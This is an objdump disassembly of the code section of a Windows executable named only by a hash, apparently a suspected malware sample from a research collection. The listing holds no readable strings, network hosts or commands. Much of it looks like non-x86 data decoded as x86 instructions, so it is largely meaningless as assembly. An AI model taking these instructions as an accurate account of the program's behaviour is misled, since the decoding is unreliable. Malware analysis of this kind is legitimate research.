
bb6d22555aad3510ec96713f5ea4158d7bc02b75c8b344694654c8c8e0dccb98.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	sar    BYTE PTR [edx+0x0],1
  402006:	add    BYTE PTR [eax],al
  402008:	dec    eax
  402009:	add    BYTE PTR [eax],al
  40200b:	add    BYTE PTR [edx],al
  40200d:	add    BYTE PTR ds:0x53b000,al
  402013:	add    BYTE PTR [eax+0x66],bh
  402016:	add    BYTE PTR [eax],al
  402018:	or     DWORD PTR [eax],eax
  40201a:	add    BYTE PTR [eax],al
  40201c:	push   ds
  40201d:	add    BYTE PTR [eax],al
  40201f:	push   es
  402020:	push   eax
  402021:	cmp    eax,DWORD PTR [eax]
  402023:	add    BYTE PTR [esi+0x18],bl
  402026:	add    BYTE PTR [eax],al
  402028:	push   eax
  402029:	and    BYTE PTR [eax],al
  40202b:	add    BYTE PTR [eax+0x0],al
	...
  40204d:	add    BYTE PTR [eax],al
  40204f:	add    BYTE PTR [edi+0x591cff2b],ah
  402055:	iret   
  402056:	and    ah,BYTE PTR [esi-0x54d13af8]
  40205c:	dec    edx
  40205d:	pop    edx
  40205e:	push   0x4b267d4d
  402063:	cmp    BYTE PTR [eax+0x7bc137a6],dh
  402069:	outs   dx,BYTE PTR ds:[esi]
  40206a:	push   eax
  40206b:	repz (bad) 
  40206d:	imul   esi,DWORD PTR [esi],0xffffff84
  402070:	repnz push edx
  402072:	jae    0x4020ca
  402074:	das    
  402075:	add    ebx,DWORD PTR [edx+0x73f53c8a]
  40207b:	dec    ecx
  40207c:	adc    edi,ebx
  40207e:	mov    ch,0xa9
  402080:	push   ebx
  402081:	(bad)  
  402082:	in     eax,0x28
  402084:	and    eax,0xe4ae8c9b
  402089:	out    dx,eax
  40208a:	sub    al,BYTE PTR [ecx-0x22]
  40208d:	ret    
  40208e:	xor    al,0x63
  402090:	leave  
  402091:	inc    edi
  402092:	push   esp
  402093:	cmp    al,dh
  402095:	inc    esp
  402096:	icebp  
  402097:	ffreep st(4)
  402099:	icebp  
  40209a:	sub    eax,0x8fb9314d
  40209f:	push   ss
  4020a0:	ret    0x82c3
  4020a3:	mov    cl,0xba
  4020a5:	push   ds
  4020a6:	xchg   ecx,eax
  4020a7:	mov    edi,0x74ca625b
  4020ac:	int    0xfb
  4020ae:	inc    edx
  4020af:	stos   BYTE PTR es:[edi],al
  4020b0:	and    DWORD PTR [esi+0x45],0xce2eee7a
  4020b7:	jle    0x4020bf
  4020b9:	ret    0xbeca
  4020bc:	jmp    0x62e2:0x53f8f4e7
  4020c3:	or     cl,BYTE PTR ds:0x17b7b51a
  4020c9:	mov    ch,0x83
  4020cb:	mov    al,ds:0x6b1a6f87
  4020d0:	xor    bh,BYTE PTR [esi+0x3e]
  4020d3:	add    BYTE PTR [eax],al
  4020d5:	add    al,0x2
  4020d7:	outs   dx,DWORD PTR ds:[esi]
  4020d8:	push   ss
  4020d9:	add    BYTE PTR [eax],al
  4020db:	or     ch,BYTE PTR [edx]
  4020dd:	cs jb  0x4020e1
  4020e0:	add    BYTE PTR [eax],al
  4020e2:	jo     0x40210c
  4020e4:	add    DWORD PTR [eax],eax
  4020e6:	add    BYTE PTR [esi],al
  4020e8:	sub    ch,BYTE PTR [esi]
  4020ea:	jb     0x402137
  4020ec:	add    BYTE PTR [eax],al
  4020ee:	jo     0x402118
  4020f0:	add    DWORD PTR [eax],eax
  4020f2:	add    BYTE PTR [esi],al
  4020f4:	sub    dl,BYTE PTR [esi+0x72]
  4020f7:	mov    DWORD PTR [eax],eax
  4020f9:	add    BYTE PTR [eax+0x28],dh
  4020fc:	pop    ss
  4020fd:	add    BYTE PTR [eax],al
  4020ff:	or     dh,BYTE PTR [ebx+0x18]
  402102:	add    BYTE PTR [eax],al
  402104:	or     al,BYTE PTR [eax+0x400003e]
  40210a:	sub    ah,BYTE PTR [edx]
  40210c:	add    al,BYTE PTR [ebx]
  40210e:	sub    BYTE PTR [edx],bl
  402110:	add    BYTE PTR [eax],al
  402112:	or     ch,BYTE PTR [edx]
  402114:	sahf   
  402115:	add    bh,BYTE PTR [ebx+0x3f]
  402118:	add    BYTE PTR [eax],al
  40211a:	add    al,0x2d
  40211c:	sbb    BYTE PTR [edx],al
  40211e:	pop    ss
  40211f:	jge    0x402160
  402121:	add    BYTE PTR [eax],al
  402123:	add    al,0x2
  402125:	add    ch,BYTE PTR [eax]
  402127:	sbb    eax,DWORD PTR [eax]
  402129:	add    BYTE PTR [edx],cl
  40212b:	sub    BYTE PTR [esi],cl
  40212d:	add    BYTE PTR [eax],al
  40212f:	push   es
  402130:	sub    BYTE PTR [eax+eax*1],bl
  402133:	add    BYTE PTR [edx],cl
  402135:	add    ch,BYTE PTR [eax]
  402137:	sbb    eax,DWORD PTR [eax]
  402139:	add    BYTE PTR [edx],cl
  40213b:	sub    ah,BYTE PTR [edx]
  40213d:	add    al,BYTE PTR [ebx]
  40213f:	sub    BYTE PTR ds:0x2a0a0000,bl
  402145:	push   ds
  402146:	add    ebp,DWORD PTR [eax]
  402148:	push   cs
  402149:	add    BYTE PTR [eax],al
  40214b:	push   es
  40214c:	sub    cl,BYTE PTR [edx+0x1e2802]
  402152:	add    BYTE PTR [edx],cl
  402154:	add    dh,BYTE PTR [edx-0x55]
  402157:	add    BYTE PTR [eax],al
  402159:	jo     0x40215d
  40215b:	sub    BYTE PTR [edi],bl
  40215d:	add    BYTE PTR [eax],al
  40215f:	or     ch,BYTE PTR [edi+0x20]
  402162:	add    BYTE PTR [eax],al
  402164:	or     dh,BYTE PTR [ebx+0x18]
  402167:	add    BYTE PTR [eax],al
  402169:	or     bh,BYTE PTR [ebp+0x62]
  40216c:	add    BYTE PTR [eax],al
  40216e:	add    al,0x2a
  402170:	adc    esi,DWORD PTR [eax]
  402172:	add    eax,DWORD PTR [eax]
  402174:	and    BYTE PTR [eax],al
  402176:	add    BYTE PTR [eax],al
  402178:	add    DWORD PTR [eax],eax
  40217a:	add    BYTE PTR [ecx],dl
  40217c:	jle    0x4021df
  40217e:	add    BYTE PTR [eax],al
  402180:	add    al,0x2d
  402182:	adc    esi,DWORD PTR [ebx+0x9]
  402185:	add    BYTE PTR [eax],al
  402187:	push   es
  402188:	or     bh,BYTE PTR [edi+0x61]
  40218b:	add    BYTE PTR [eax],al
  40218d:	add    al,0x6
  40218f:	adc    al,0x28
  402191:	add    DWORD PTR [eax],eax
  402193:	add    BYTE PTR [ebx],ch
  402195:	es jle 0x4021f9
  402198:	add    BYTE PTR [eax],al
  40219a:	add    al,0x2a
  40219c:	or     dl,BYTE PTR [edx+ebp*1]
  40219f:	sub    BYTE PTR cs:[edx],cl
  4021a2:	add    BYTE PTR [eax],al
  4021a4:	push   es
  4021a5:	jnp    0x402209
  4021a7:	add    BYTE PTR [eax],al
  4021a9:	add    al,0x2a
  4021ab:	add    BYTE PTR [ebx],dl
  4021ad:	xor    BYTE PTR ds:0x7500,al
  4021b3:	add    BYTE PTR [edx],al
  4021b5:	add    BYTE PTR [eax],al
  4021b7:	adc    DWORD PTR [eax],ebp
  4021b9:	or     al,BYTE PTR [eax]
  4021bb:	add    BYTE PTR [esi],al
  4021bd:	or     al,BYTE PTR [esi]
  4021bf:	sub    eax,0x62a1402
  4021c4:	jnp    0x402228
  4021c6:	add    BYTE PTR [eax],al
  4021c8:	add    al,0x2
  4021ca:	sub    BYTE PTR [ebx],cl
  4021cc:	add    BYTE PTR [eax],al
  4021ce:	push   es
  4021cf:	outs   dx,DWORD PTR ds:[esi]
  4021d0:	and    al,BYTE PTR [eax]
  4021d2:	add    BYTE PTR [edx],cl
  4021d4:	or     eax,DWORD PTR [ebx]
  4021d6:	sub    al,0x53
  4021d8:	add    ecx,DWORD PTR [esi+0x4d311669]
  4021de:	push   ss
  4021df:	or     al,0x2b
  4021e1:	add    ecx,DWORD PTR ss:[eax]
  4021e4:	call   0xd01:0x2d75
  4021eb:	or     DWORD PTR [esi+eiz*1],ebp
  4021ee:	or     DWORD PTR [edi+0x23],ebp
  4021f1:	add    BYTE PTR [eax],al
  4021f3:	or     ah,BYTE PTR [eax]
  4021f5:	add    BYTE PTR [eax+eax*1],al
  4021f8:	add    BYTE PTR [ecx],dh
  4021fa:	sbb    DWORD PTR [ebx],eax
  4021fc:	or     BYTE PTR [ecx],cl
  4021fe:	push   ss
  4021ff:	and    ch,bh
  402201:	add    eax,DWORD PTR [eax]
  402203:	add    BYTE PTR [edi+0x24],ch
  402206:	add    BYTE PTR [eax],al
  402208:	or     dh,BYTE PTR [edx-0x4f]
  40220b:	add    BYTE PTR [eax],al
  40220d:	jo     0x402237
  40220f:	and    eax,0xa20a0000
  402214:	or     BYTE PTR [edi],dl
  402216:	pop    eax
  402217:	or     al,0x8
  402219:	add    ecx,DWORD PTR [esi+0x28c43269]
  40221f:	add    BYTE PTR es:[eax],al
  402222:	or     al,BYTE PTR [edi]
  402224:	add    ebp,DWORD PTR [eax]
  402226:	daa    
  402227:	add    BYTE PTR [eax],al
  402229:	or     ch,BYTE PTR [edx]
  40222b:	pop    es
  40222c:	sub    al,BYTE PTR [eax]
  40222e:	add    BYTE PTR [eax],al
  402230:	adc    esi,DWORD PTR [eax]
  402232:	add    eax,DWORD PTR [eax]
  402234:	sbb    eax,0x1000000
  402239:	add    BYTE PTR [eax],al
  40223b:	adc    DWORD PTR [eax],ebp
  40223d:	or     al,BYTE PTR [eax]
  40223f:	add    BYTE PTR [esi],al
  402241:	or     al,BYTE PTR [esi]
  402243:	sub    eax,0x62a1402
  402248:	jnp    0x4022ac
  40224a:	add    BYTE PTR [eax],al
  40224c:	add    al,0x2
  40224e:	sub    BYTE PTR [ebx],cl
  402250:	add    BYTE PTR [eax],al
  402252:	push   es
  402253:	outs   dx,DWORD PTR ds:[esi]
  402254:	and    al,BYTE PTR [eax]
  402256:	add    BYTE PTR [edx],cl
  402258:	sub    al,BYTE PTR [eax]
  40225a:	add    BYTE PTR [eax],al
  40225c:	adc    esi,DWORD PTR [eax]
  40225e:	add    eax,DWORD PTR [eax]
  402260:	sbb    eax,0x1000000
  402265:	add    BYTE PTR [eax],al
  402267:	adc    DWORD PTR [eax],ebp
  402269:	or     al,BYTE PTR [eax]
  40226b:	add    BYTE PTR [esi],al
  40226d:	or     al,BYTE PTR [esi]
  40226f:	sub    eax,0x62a1402
  402274:	jnp    0x4022d8
  402276:	add    BYTE PTR [eax],al
  402278:	add    al,0x2
  40227a:	sub    BYTE PTR [ebx],cl
  40227c:	add    BYTE PTR [eax],al
  40227e:	push   es
  40227f:	outs   dx,DWORD PTR ds:[esi]
  402280:	sub    BYTE PTR [eax],al
  402282:	add    BYTE PTR [edx],cl
  402284:	sub    al,BYTE PTR [eax]
  402286:	add    BYTE PTR [eax],al
  402288:	adc    esi,DWORD PTR [eax]
  40228a:	add    al,0x0
  40228c:	dec    esi
  40228d:	add    BYTE PTR [eax],al
  40228f:	add    BYTE PTR [ebx],al
  402291:	add    BYTE PTR [eax],al
  402293:	adc    DWORD PTR [edx],eax
  402295:	add    esi,DWORD PTR [ebx+0x40]
  402298:	add    BYTE PTR [eax],al
  40229a:	push   es
  40229b:	or     bh,BYTE PTR [esi-0x74]
  40229e:	add    BYTE PTR [eax],al
  4022a0:	add    al,0x2
  4022a2:	outs   dx,DWORD PTR ds:[esi]
  4022a3:	sub    DWORD PTR [eax],eax
  4022a5:	add    BYTE PTR [edx],cl
  4022a7:	sub    al,0x20
  4022a9:	jb     0x402264
  4022ab:	add    BYTE PTR [eax],al
  4022ad:	jo     0x4022c6
  4022af:	lea    eax,[ecx]
  4022b1:	add    BYTE PTR [eax],al
  4022b3:	add    DWORD PTR [ebx],ecx
  4022b5:	pop    es
  4022b6:	push   ss
  4022b7:	add    ah,BYTE PTR [edx+0xd2807]
  4022bd:	add    BYTE PTR [esi],al
  4022bf:	add    al,0x5
  4022c1:	push   cs
  4022c2:	add    al,0x28
  4022c4:	sbb    eax,DWORD PTR [eax]
  4022c6:	add    BYTE PTR [esi],al
  4022c8:	sub    bh,BYTE PTR [esi-0x75]
  4022cb:	add    BYTE PTR [eax],al
  4022cd:	add    al,0x6
  4022cf:	outs   dx,DWORD PTR ds:[esi]
  4022d0:	sub    al,BYTE PTR [eax]
  4022d2:	add    BYTE PTR [edx],cl
  4022d4:	es jle 0x402263
  4022d7:	add    BYTE PTR [eax],al
  4022d9:	add    al,0x2
  4022db:	add    ebp,DWORD PTR [edi+0x2b]
  4022de:	add    BYTE PTR [eax],al
  4022e0:	or     ch,BYTE PTR [edx]
  4022e2:	add    BYTE PTR [eax],al
  4022e4:	adc    esi,DWORD PTR [eax]
  4022e6:	add    al,0x0
  4022e8:	dec    ebx
  4022e9:	add    BYTE PTR [eax],al
  4022eb:	add    BYTE PTR [ebx],al
  4022ed:	add    BYTE PTR [eax],al
  4022ef:	adc    DWORD PTR [edx],eax
  4022f1:	add    esi,DWORD PTR [ebx+0x40]
  4022f4:	add    BYTE PTR [eax],al
  4022f6:	push   es
  4022f7:	or     bh,BYTE PTR [esi-0x74]
  4022fa:	add    BYTE PTR [eax],al
  4022fc:	add    al,0x2
  4022fe:	outs   dx,DWORD PTR ds:[esi]
  4022ff:	sub    DWORD PTR [eax],eax
  402301:	add    BYTE PTR [edx],cl
  402303:	sub    al,0x1d
  402305:	jb     0x4022c0
  402307:	add    BYTE PTR [eax],al
  402309:	jo     0x402322
  40230b:	lea    eax,[ecx]
  40230d:	add    BYTE PTR [eax],al
  40230f:	add    DWORD PTR [ebx],ecx
  402311:	pop    es
  402312:	push   ss
  402313:	add    ah,BYTE PTR [edx+0xd2807]
  402319:	add    BYTE PTR [esi],al
  40231b:	add    al,0x28
  40231d:	sbb    DWORD PTR [eax],eax
  40231f:	add    BYTE PTR [esi],al
  402321:	sub    bh,BYTE PTR [esi-0x75]
  402324:	add    BYTE PTR [eax],al
  402326:	add    al,0x6
  402328:	outs   dx,DWORD PTR ds:[esi]
  402329:	sub    al,BYTE PTR [eax]
  40232b:	add    BYTE PTR [edx],cl
  40232d:	es jle 0x4022bc
  402330:	add    BYTE PTR [eax],al
  402332:	add    al,0x2
  402334:	add    ebp,DWORD PTR [edi+0x2b]
  402337:	add    BYTE PTR [eax],al
  402339:	or     ch,BYTE PTR [edx]
  40233b:	and    al,BYTE PTR [edx]
  40233d:	push   ss
  40233e:	sub    BYTE PTR [ebx],dl
  402340:	add    BYTE PTR [eax],al
  402342:	push   es
  402343:	sub    dl,BYTE PTR [ebx]
  402345:	xor    BYTE PTR [eax+eax*1],al
  402348:	and    eax,0x4000000
  40234d:	add    BYTE PTR [eax],al
  40234f:	adc    DWORD PTR [edx-0x1d],esi
  402352:	add    BYTE PTR [eax],al
  402354:	jo     0x402360
  402356:	sub    BYTE PTR [eax+eax*1],ch
  402359:	add    BYTE PTR [edx],cl
  40235b:	push   es
  40235c:	add    al,BYTE PTR [ebx]
  40235e:	mov    WORD PTR [ecx],?
  402360:	add    BYTE PTR [eax],al
  402362:	add    DWORD PTR [edi+0x2d],ebp
  402365:	add    BYTE PTR [eax],al
  402367:	or     bh,BYTE PTR [esi-0x77]
  40236a:	add    BYTE PTR [eax],al
  40236c:	add    al,0x17
  40236e:	pop    eax
  40236f:	or     BYTE PTR [ecx+0x2a040000],0x26
  402376:	add    al,BYTE PTR [ebx]
  402378:	push   ss
  402379:	sub    BYTE PTR ds:0x2a060000,dl
  40237f:	add    BYTE PTR [ebx],dl
  402381:	xor    BYTE PTR ds:0x2600,al
  402387:	add    BYTE PTR [eax+eax*1],al
  40238a:	add    BYTE PTR [ecx],dl
  40238c:	jb     0x4023af
  40238e:	add    DWORD PTR [eax],eax
  402390:	jo     0x40239c
  402392:	sub    BYTE PTR [eax+eax*1],ch
  402395:	add    BYTE PTR [edx],cl
  402397:	push   es
  402398:	add    eax,DWORD PTR [esp+ecx*4]
  40239b:	xor    DWORD PTR [eax],eax
  40239d:	add    BYTE PTR [ecx],al
  40239f:	add    ch,BYTE PTR [edi+0x2e]
  4023a2:	add    BYTE PTR [eax],al
  4023a4:	or     bh,BYTE PTR [esi-0x77]
  4023a7:	add    BYTE PTR [eax],al
  4023a9:	add    al,0x17
  4023ab:	pop    eax
  4023ac:	or     BYTE PTR [ecx+0x2a040000],0x2e
  4023b3:	add    al,BYTE PTR [ebx]
  4023b5:	add    al,0x5
  4023b7:	push   ss
  4023b8:	sub    BYTE PTR [edi],dl
  4023ba:	add    BYTE PTR [eax],al
  4023bc:	push   es
  4023bd:	sub    al,BYTE PTR [eax]
  4023bf:	add    BYTE PTR [ebx],dl
  4023c1:	xor    BYTE PTR ds:0x4a00,al
  4023c7:	add    BYTE PTR ds:0x72110000,al
  4023cd:	pop    ecx
  4023ce:	add    DWORD PTR [eax],eax
  4023d0:	jo     0x4023dc
  4023d2:	sub    BYTE PTR [eax+eax*1],ch
  4023d5:	add    BYTE PTR [edx],cl
  4023d7:	push   es
  4023d8:	sbb    ecx,DWORD PTR [ebp+0x1000001]
  4023de:	or     eax,DWORD PTR [edi]
  4023e0:	push   ss
  4023e1:	add    esp,DWORD PTR [edx-0x73fbe8f9]
  4023e7:	xor    DWORD PTR [eax],eax
  4023e9:	add    BYTE PTR [ecx],al
  4023eb:	mov    ds:0x8c051807,al
  4023f0:	xor    DWORD PTR [eax],eax
  4023f2:	add    BYTE PTR [ecx],al
  4023f4:	mov    ds:0x40e1907,al
  4023f9:	mov    WORD PTR [ecx],?
  4023fb:	add    BYTE PTR [eax],al
  4023fd:	add    DWORD PTR [edx-0x5dfde5f9],esp
  402403:	pop    es
  402404:	outs   dx,DWORD PTR ds:[esi]
  402405:	das    
  402406:	add    BYTE PTR [eax],al
  402408:	or     bh,BYTE PTR [esi-0x77]
  40240b:	add    BYTE PTR [eax],al
  40240d:	add    al,0x17
  40240f:	pop    eax
  402410:	or     BYTE PTR [ecx+0x2a040000],0x0
  402417:	add    BYTE PTR [ebx],dl
  402419:	xor    BYTE PTR [ebx],al
  40241b:	add    BYTE PTR [edi],bl
  40241d:	add    BYTE PTR [eax],al
  40241f:	add    BYTE PTR [eax+eax*1],al
  402422:	add    BYTE PTR [ecx],dl
  402424:	jb     0x4023c7
  402426:	add    DWORD PTR [eax],eax
  402428:	jo     0x402434
  40242a:	sub    BYTE PTR [eax+eax*1],ch
  40242d:	add    BYTE PTR [edx],cl
  40242f:	push   es
  402430:	add    ch,BYTE PTR [edi+0x30]
  402433:	add    BYTE PTR [eax],al
  402435:	or     bh,BYTE PTR [esi-0x76]
  402438:	add    BYTE PTR [eax],al
  40243a:	add    al,0x17
  40243c:	pop    eax
  40243d:	or     BYTE PTR [edx+0x2a040000],0x26
  402444:	add    al,BYTE PTR [ebx]
  402446:	push   ss
  402447:	sub    BYTE PTR [edx],bl
  402449:	add    BYTE PTR [eax],al
  40244b:	push   es
  40244c:	sub    al,BYTE PTR [eax]
  40244e:	add    BYTE PTR [eax],al
  402450:	adc    esi,DWORD PTR [eax]
  402452:	add    eax,0x2600
  402457:	add    BYTE PTR [eax+eax*1],al
  40245a:	add    BYTE PTR [ecx],dl
  40245c:	jb     0x40243b
  40245e:	add    DWORD PTR [eax],eax
  402460:	jo     0x40246c
  402462:	sub    BYTE PTR [eax+eax*1],ch
  402465:	add    BYTE PTR [edx],cl
  402467:	push   es
  402468:	add    eax,DWORD PTR [esp+ecx*4]
  40246b:	xor    DWORD PTR [eax],eax
  40246d:	add    BYTE PTR [ecx],al
  40246f:	add    ch,BYTE PTR [edi+0x2e]
  402472:	add    BYTE PTR [eax],al
  402474:	or     bh,BYTE PTR [esi-0x76]
  402477:	add    BYTE PTR [eax],al
  402479:	add    al,0x17
  40247b:	pop    eax
  40247c:	or     BYTE PTR [edx+0x2a040000],0x2e
  402483:	add    al,BYTE PTR [ebx]
  402485:	add    al,0x5
  402487:	push   ss
  402488:	sub    BYTE PTR [eax+eax*1],bl
  40248b:	add    BYTE PTR [esi],al
  40248d:	sub    al,BYTE PTR [eax]
  40248f:	add    BYTE PTR [ebx],dl
  402491:	xor    BYTE PTR ds:0x4a00,al
  402497:	add    BYTE PTR ds:0x72110000,al
  40249d:	sbb    DWORD PTR [edx],eax
  40249f:	add    BYTE PTR [eax+0xa],dh
  4024a2:	sub    BYTE PTR [eax+eax*1],ch
  4024a5:	add    BYTE PTR [edx],cl
  4024a7:	push   es
  4024a8:	sbb    ecx,DWORD PTR [ebp+0x1000001]
  4024ae:	or     eax,DWORD PTR [edi]
  4024b0:	push   ss
  4024b1:	add    esp,DWORD PTR [edx-0x73fbe8f9]
  4024b7:	xor    DWORD PTR [eax],eax
  4024b9:	add    BYTE PTR [ecx],al
  4024bb:	mov    ds:0x8c051807,al
  4024c0:	xor    DWORD PTR [eax],eax
  4024c2:	add    BYTE PTR [ecx],al
  4024c4:	mov    ds:0x40e1907,al
  4024c9:	mov    WORD PTR [ecx],?
  4024cb:	add    BYTE PTR [eax],al
  4024cd:	add    DWORD PTR [edx-0x5dfde5f9],esp
  4024d3:	pop    es
  4024d4:	outs   dx,DWORD PTR ds:[esi]
  4024d5:	das    
  4024d6:	add    BYTE PTR [eax],al
  4024d8:	or     bh,BYTE PTR [esi-0x76]
  4024db:	add    BYTE PTR [eax],al
  4024dd:	add    al,0x17
  4024df:	pop    eax
  4024e0:	or     BYTE PTR [edx+0x2a040000],0x0
  4024e7:	add    BYTE PTR [ebx],dl
  4024e9:	xor    BYTE PTR [eax+eax*1],al
  4024ec:	add    BYTE PTR [eax],0x0
  4024ef:	add    BYTE PTR ds:0x2110000,al
  4024f5:	sub    BYTE PTR [ecx],dh
  4024f7:	add    BYTE PTR [eax],al
  4024f9:	or     cl,BYTE PTR [edx]
  4024fb:	push   es
  4024fc:	jb     0x402563
  4024fe:	add    al,BYTE PTR [eax]
  402500:	jo     0x402519
  402502:	sub    BYTE PTR [edx],dh
  402504:	add    BYTE PTR [eax],al
  402506:	or     ch,BYTE PTR [eax]
  402508:	xor    eax,DWORD PTR [eax]
  40250a:	add    BYTE PTR [edx],cl
  40250c:	sub    al,0x13
  40250e:	push   es
  40250f:	jb     0x402580
  402511:	add    al,BYTE PTR [eax]
  402513:	jo     0x40252c
  402515:	sub    BYTE PTR [edx],dh
  402517:	add    BYTE PTR [eax],al
  402519:	or     ch,BYTE PTR [eax]
  40251b:	xor    eax,DWORD PTR [eax]
  40251d:	add    BYTE PTR [edx],cl
  40251f:	sub    eax,0x62a1602
  402524:	jb     0x4024a7
  402526:	add    al,BYTE PTR [eax]
  402528:	jo     0x402541
  40252a:	sub    BYTE PTR [edx],dh
  40252c:	add    BYTE PTR [eax],al
  40252e:	or     ch,BYTE PTR [eax]
  402530:	xor    eax,DWORD PTR [eax]
  402532:	add    BYTE PTR [edx],cl
  402534:	sub    eax,0x62a1702
  402539:	jb     0x4024c8
  40253b:	add    al,BYTE PTR [eax]
  40253d:	jo     0x402556
  40253f:	sub    BYTE PTR [edx],dh
  402541:	add    BYTE PTR [eax],al
  402543:	or     ch,BYTE PTR [eax]
  402545:	xor    eax,DWORD PTR [eax]
  402547:	add    BYTE PTR [edx],cl
  402549:	sub    eax,0x722a1802
  40254e:	mov    ds:0x18700002,eax
  402553:	lea    eax,[ecx]
  402555:	add    BYTE PTR [eax],al
  402557:	add    DWORD PTR [ebx],ecx
  402559:	pop    es
  40255a:	push   ss
  40255b:	push   es
  40255c:	mov    ds:0xa2021707,al
  402561:	pop    es
  402562:	sub    BYTE PTR ds:0x28060000,cl
  402568:	adc    al,BYTE PTR [eax]
  40256a:	add    BYTE PTR [esi],al
  40256c:	adc    eax,0x3428
  402571:	or     dl,BYTE PTR [esi]
  402573:	sub    bl,BYTE PTR [ebx]
  402575:	xor    BYTE PTR [esi],al
  402577:	add    BYTE PTR [edi],bl
  402579:	push   es
  40257a:	add    BYTE PTR [eax],al
  40257c:	push   es
  40257d:	add    BYTE PTR [eax],al
  40257f:	adc    DWORD PTR ds:0x3528,edx
  402585:	or     al,BYTE PTR [edx]
  402587:	mov    gs,WORD PTR [ecx+0x17]
  40258a:	xor    bh,BYTE PTR [edx+eax*1]
  40258d:	push   ss
  40258e:	call   0x6f70:0x2cd72
  402595:	add    BYTE PTR ss:[eax],al
  402598:	or     ch,BYTE PTR ds:0x9a16022d
  40259e:	jb     0x402573
  4025a0:	add    al,BYTE PTR [eax]
  4025a2:	jo     0x402613
  4025a4:	add    BYTE PTR ss:[eax],al
  4025a7:	or     ch,BYTE PTR ds:0x9a16021e
  4025ad:	jb     0x402588
  4025af:	add    al,BYTE PTR [eax]
  4025b1:	jo     0x402622
  4025b3:	add    BYTE PTR ss:[eax],al
  4025b6:	or     ch,BYTE PTR ds:0x9a16020f
  4025bc:	jb     0x40259d
  4025be:	add    al,BYTE PTR [eax]
  4025c0:	jo     0x402631
  4025c2:	add    BYTE PTR ss:[eax],al
  4025c5:	or     ch,BYTE PTR [esi+eax*1]
  4025c8:	sub    BYTE PTR [edx],ch
  4025ca:	add    BYTE PTR [eax],al
  4025cc:	push   es
  4025cd:	sub    dl,BYTE PTR [edx+ecx*1]
  4025d0:	adc    al,0xb
  4025d2:	adc    al,0xc
  4025d4:	push   ss
  4025d5:	or     eax,0x16041316
  4025da:	adc    eax,DWORD PTR ds:0x17061316
  4025e0:	adc    eax,DWORD PTR [edi]
  4025e2:	cmp    BYTE PTR [edi+0x2000004],dl
  4025e8:	or     DWORD PTR [edx+0x2e572],ebx
  4025ee:	jo     0x40265f
  4025f0:	add    BYTE PTR ss:[eax],al
  4025f3:	or     bh,BYTE PTR [ecx]
  4025f5:	test   eax,0x2000001
  4025fa:	mov    gs,WORD PTR [ecx+0x9]
  4025fd:	pop    ecx
  4025fe:	pop    ss
  4025ff:	pop    ecx
  402600:	lea    ebp,ds:0xa010000
  402606:	add    cl,BYTE PTR [esi+0x17590969]
  40260c:	pop    ecx
  40260d:	lea    ebp,ds:0xb010000
  402613:	push   ss
  402614:	adc    ecx,DWORD PTR [eax]
  402616:	cmp    BYTE PTR [eax+0x1],bh
  402619:	add    BYTE PTR [eax],al
  40261b:	push   es
  40261c:	adc    DWORD PTR [eax],ecx
  40261e:	add    cl,BYTE PTR [ecx]
  402620:	pop    ss
  402621:	pop    eax
  402622:	call   0x729a:0x81106a2
  402629:	test   DWORD PTR [edx],0x376f7000
  40262f:	add    BYTE PTR [eax],al
  402631:	or     dl,BYTE PTR [ebx]
  402633:	or     DWORD PTR [ecx],edx
  402635:	or     DWORD PTR ds:0xc03b,edx
  40263b:	add    BYTE PTR [esi],al
  40263d:	adc    DWORD PTR [eax],ecx
  40263f:	call   0x1108:0x11060a13
  402646:	or     dl,BYTE PTR [esi]
  402648:	adc    DWORD PTR [ecx],ecx
  40264a:	outs   dx,DWORD PTR ds:[esi]
  40264b:	and    al,0x0
  40264d:	add    BYTE PTR [edx],cl
  40264f:	mov    ds:0x9a081106,al
  402654:	sub    BYTE PTR [eax],ah
  402656:	add    BYTE PTR [eax],al
  402658:	push   es
  402659:	sub    eax,0x2fb7226
  40265e:	add    BYTE PTR [eax+0x17],dh
  402661:	lea    eax,[ecx]
  402663:	add    BYTE PTR [eax],al
  402665:	add    DWORD PTR [ebx],edx
  402667:	pop    ss
  402668:	adc    DWORD PTR [edi],edx
  40266a:	push   ss
  40266b:	push   es
  40266c:	adc    DWORD PTR [eax],ecx
  40266e:	call   0xd:0x281711a2
  402675:	add    BYTE PTR [esi],al
  402677:	sub    BYTE PTR [edx],dl
  402679:	add    BYTE PTR [eax],al
  40267b:	push   es
  40267c:	cmp    cl,bh
  40267e:	add    eax,DWORD PTR [eax]
  402680:	add    BYTE PTR [ecx],dl
  402682:	or     DWORD PTR [ecx],edx
  402684:	or     ch,BYTE PTR [edi+0x23]
  402687:	add    BYTE PTR [eax],al
  402689:	or     dl,BYTE PTR [edi]
  40268b:	pop    ecx
  40268c:	xor    ebp,DWORD PTR [ebx]
  40268e:	jb     0x4026ad
  402690:	add    eax,DWORD PTR [eax]
  402692:	jo     0x4026ab
  402694:	lea    eax,[ecx]
  402696:	add    BYTE PTR [eax],al
  402698:	add    DWORD PTR [ebx],edx
  40269a:	sbb    BYTE PTR [ecx],dl
  40269c:	sbb    BYTE PTR [esi],dl
  40269e:	adc    DWORD PTR [edx],ecx
  4026a0:	mov    ds:0xd281811,al
  4026a5:	add    BYTE PTR [eax],al
  4026a7:	push   es
  4026a8:	sub    BYTE PTR [edx],dl
  4026aa:	add    BYTE PTR [eax],al
  4026ac:	push   es
  4026ad:	push   ss
  4026ae:	lea    ebp,ds:0xa010000
  4026b4:	cmp    cl,al
  4026b6:	add    eax,DWORD PTR [eax]
  4026b8:	add    BYTE PTR [edi],al
  4026ba:	adc    DWORD PTR [eax],ecx
  4026bc:	adc    DWORD PTR [edx],ecx
  4026be:	adc    DWORD PTR [ecx],ecx
  4026c0:	pop    ss
  4026c1:	pop    eax
  4026c2:	outs   dx,DWORD PTR ds:[esi]
  4026c3:	cmp    BYTE PTR [eax],al
  4026c5:	add    BYTE PTR [edx],cl
  4026c7:	mov    ds:0x9a081107,al
  4026cc:	sub    BYTE PTR [eax],ah
  4026ce:	add    BYTE PTR [eax],al
  4026d0:	push   es
  4026d1:	cmp    dh,BYTE PTR [ebx+0x72000000]
  4026d7:	sti    
  4026d8:	add    al,BYTE PTR [eax]
  4026da:	jo     0x4026f3
  4026dc:	lea    eax,[ecx]
  4026de:	add    BYTE PTR [eax],al
  4026e0:	add    DWORD PTR [ebx],edx
  4026e2:	sbb    DWORD PTR [ecx],edx
  4026e4:	sbb    DWORD PTR [esi],edx
  4026e6:	pop    es
  4026e7:	adc    DWORD PTR [eax],ecx
  4026e9:	call   0xd:0x281911a2
  4026f0:	add    BYTE PTR [esi],al
